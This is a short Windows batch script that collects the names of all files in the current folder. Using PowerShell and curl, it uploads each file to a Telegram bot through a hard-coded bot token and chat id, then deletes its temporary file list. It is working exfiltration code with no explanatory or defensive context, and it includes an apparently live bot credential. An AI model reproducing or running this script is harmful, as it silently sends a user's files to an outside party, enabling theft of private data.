dir /b >list.txt
powershell -Command "(gc list.txt) -replace '^', 'curl -F document=@doublequotes180' -replace '$', 'doublequotes180 https://api.telegram.org/bot2075322260:AAHwa3tRJuugVL03whnhUwoWFtOGBwpZ-gQ/sendDocument?chat_id=688448558' -replace 'doublequotes180', '\"'  |cmd
del list.txt
